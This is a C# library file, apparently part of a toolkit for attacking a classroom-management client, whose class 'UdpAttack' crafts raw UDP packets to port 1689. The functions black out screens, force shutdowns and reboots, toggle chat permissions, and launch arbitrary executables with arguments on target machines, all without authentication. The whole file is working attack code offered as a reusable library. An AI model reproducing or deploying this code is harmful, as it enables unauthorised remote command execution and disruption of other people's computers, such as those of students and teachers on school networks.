using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using MythwareUdpAttack = T4CLLibrary.Mythware.UdpAttack;

namespace T4CLLibrary.RedSpider
{
    public static class UdpAttack
    {
        private readonly static byte[] openHeader =      { 0x10, 0xd, 0x0, 0x0, 0x40, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x10, 0xc0, 0xa8, 0xf8, 0x81, 0x6f, 0x0, 0x70, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0/*是否最大化*/, 0x0, 0x0, 0x0 };
        private readonly static byte[] shutdownPayload = { 0x10, 0xd, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0/*1：强制；0：非强制*/, 0x0, 0x0, 0x0, 0xc0, 0xa8, 0xf8, 0x8b };
        private readonly static byte[] rebootPayload =   { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0/*1：强制；0：非强制*/, 0x0, 0x0, 0x0, 0xc0, 0xa8, 0xf8, 0x81, 0xc0, 0xa8, 0xf8, 0x8b };
        static readonly byte[] allowSendMsgPayload =     { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4/*4：允许发送；8：不允许发送*/, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc0, 0xa8, 0xf8, 0x81, 0xc0, 0xa8, 0xf8, 0x8b };

        private static void SendUdpPacket(string ip, int port, byte[] data)
        {
            using (var udpClient = new UdpClient())
            {
                udpClient.Connect(ip, port);
                udpClient.Send(data, data.Length);
            }
        }

        /// <summary>
        /// 发送黑屏数据包
        /// </summary>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口，默认为1689</param>
        /// <param name="blackScreen">
        /// 黑屏还是解除黑屏，值的意思代表: 
        /// <para>true: 黑屏</para>
        /// <para>false: 解除黑屏</para>
        /// <para>默认值: true</para>
        /// </param>
        public static void SendBlackScreenPacket(string ip, int port = 1689, bool blackScreen = true)
        {
            byte[] payload = { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1/*1:黑屏，2:解除*/, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc0, 0xa8, 0xf8, 0x81, 0xc0, 0xa8, 0xf8, 0x8b };
            //byte[] payloadunblackScreen = { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc0, 0xa8, 0xf8, 0x81, 0xc0, 0xa8, 0xf8, 0x8b };
            if(blackScreen)
            {
                payload[13] = 0x1; // 黑屏
            }
            else
            {
                payload[13] = 0x2; // 解除黑屏
            }

            SendUdpPacket(ip, port, payload);
        }

        /// <summary>
        /// 发送命令数据包
        /// </summary>
        /// <param name="command">命令（可执行文件路径）</param>
        /// <param name="args">参数</param>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口</param>
        /// <param name="isMaximized">是否最大化</param>
        public static void SendCommandPacket(string command, string args, string ip, int port = 1689, bool isMaximized = false)
        {
            var packet = MakeCommandPacket(command, args,isMaximized);
            SendUdpPacket(ip, port, packet.ToArray());
        }

        /// <summary>
        /// 发送关机数据包
        /// </summary>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口号</param>
        /// <param name="force">是否强制关机</param>
        public static void SendShutdownPacket(string ip, int port = 1689,bool force = false)
        {
            byte[] payload = (byte[])shutdownPayload.Clone();
            if (force)
            {
                payload[16] = 0x1; // 强制
            }
            else
            {
                payload[16] = 0x0; // 非强制
            }
            SendUdpPacket(ip, port, payload);
        }

        /// <summary>
        /// 生成命令数据包
        /// </summary>
        /// <param name="command">命令（可执行文件路径）</param>
        /// <param name="args">参数</param>
        /// <param name="isMaximized">是否最大化</param>
        /// <returns>命令数据包</returns>
        private static List<byte> MakeCommandPacket(string command, string args,bool isMaximized = false)
        {
            List<byte> packet = new List<byte>(openHeader);

            if (isMaximized)
            {
                packet[openHeader.Length - 4] = 0x1; // 设置为最大化
            }
            else
            {
                packet[openHeader.Length - 4] = 0x0; // 设置为非最大化
            }

            List<Byte> commandBytes = MythwareUdpAttack.FormatB4Send(command);
            while (commandBytes.Count < 0x261 - 0x5A + 1)
            {
                commandBytes.Add(0x0);
            }
            packet.AddRange(commandBytes);
            List<Byte> argsBytes = MythwareUdpAttack.FormatB4Send(args);
            while (argsBytes.Count < 0x469 - 0x262 + 1)
            {
                argsBytes.Add(0x0);
            }
            packet.AddRange(argsBytes);
            return packet;
        }

        /// <summary>
        /// 发送允许或不允许发送消息数据包
        /// </summary>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口</param>
        /// <param name="allow">是否允许发送消息</param>
        public static void SendAllowChatPacket(string ip, int port = 1689, bool allow = true)
        {
            byte[] payload = (byte[])allowSendMsgPayload.Clone();
            if (allow)
            {
                payload[13] = 0x4; // 允许发送
            }
            else
            {
                payload[13] = 0x8; // 不允许发送
            }
            SendUdpPacket(ip, port, payload);
        }

        /// <summary>
        /// 发送重启数据包
        /// </summary>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口</param>
        /// <param name="force">是否强置重启</param>
        public static void SendRebootPacket(string ip, int port = 1689, bool force = false)
        {
            byte[] payload = (byte[])rebootPayload.Clone();
            if (force)
            {
                payload[16] = 0x1; // 强制重启
            }
            else
            {
                payload[16] = 0x0; // 非强制重启
            }
            SendUdpPacket(ip, port, payload);
        }
    }
}
